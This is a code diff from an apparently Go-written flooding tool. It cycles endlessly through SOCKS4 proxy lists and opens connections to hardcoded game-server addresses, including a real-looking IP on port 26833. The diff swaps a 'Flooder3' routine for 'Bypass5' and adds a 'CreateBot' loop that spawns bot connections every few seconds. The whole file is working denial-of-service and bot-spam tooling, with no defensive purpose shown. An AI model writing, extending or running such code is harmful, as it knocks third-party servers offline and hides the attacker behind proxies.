@@ -60,24 +60,17 @@ func parseProxies() []string {
 	return proxies
 }
 
-func remove(s []string, i int) []string {
-	s[i] = s[len(s)-1]
-
-	return s[:len(s)-1]
-}
-
-func connect(proxyAddress string, serverAddress string, proxies []string, i int, data *methods.Data, guard chan struct{}) {
+func connect(proxyAddress string, serverAddress string, data *methods.Data, guard chan struct{}) {
 	address := fmt.Sprintf("socks4://%s?timeout=5s", proxyAddress)
 
 	dialSocks := socks.Dial(address)
 	conn, err := dialSocks("tcp", serverAddress)
 
 	if err != nil {
-		//proxies = remove(proxies, i)
 		<-guard
 	} else {
 		for {
-			if methods.Flooder3(data, conn) {
+			if methods.Bypass5(data, conn) {
 				fmt.Println(proxyAddress)
 				<-guard
 				return
@@ -88,21 +81,56 @@ func connect(proxyAddress string, serverAddress string, proxies []string, i int,
 	}
 }
 
+/*
+func connectBot(proxyAddress string, serverAddress string, data *methods.Data, guard chan struct{}) {
+	address := fmt.Sprintf("socks4://%s?timeout=5s", proxyAddress)
+
+	dialSocks := socks.Dial(address)
+	conn, err := dialSocks("tcp", serverAddress)
+
+	if err != nil {
+
+	}
+
+	methods.SlowBot(&data)
+	//conn, err := dialSocks("tcp", serverAddress)
+}
+*/
+
+const (
+	host = "87.98.178.100"
+	port = "26833"
+)
+
+func createBot(proxyAddress string, serverAddress string, data *methods.Data, guard chan struct{}) {
+	address := fmt.Sprintf("socks4://%s?timeout=5s", proxyAddress)
+
+	dialSocks := socks.Dial(address)
+	conn, err := dialSocks("tcp", serverAddress)
+
+	if err != nil {
+		<-guard
+	} else {
+		for {
+			methods.CreateBot(data, conn, guard)
+			time.Sleep(5 * time.Second)
+		}
+	}
+}
+
 func main() {
-	address, cooldown, loop := "193.164.16.163:25565", 5, 1 //getArguments(os.Args[1:])
-
-	fmt.Println(cooldown)
-
 	proxies := parseProxies()
-	data := methods.Data{Address: address, Loop: loop}
+	data := methods.Data{Host: host, Port: port}
 
-	guard := make(chan struct{}, 6000)
+	connections := 15 //, _ := strconv.Atoi(os.Args[1:][0])
+
+	guard := make(chan struct{}, connections)
+	fmt.Println(len(guard))
 
 	for {
-		for i, proxy := range proxies {
+		for _, proxy := range proxies {
 			guard <- struct{}{}
-			go connect(proxy, address, proxies, i, &data, guard)
-			//time.Sleep(1 * time.Millisecond)
+			go createBot(proxy, host+":"+port, &data, guard)
 		}
 	}
 }
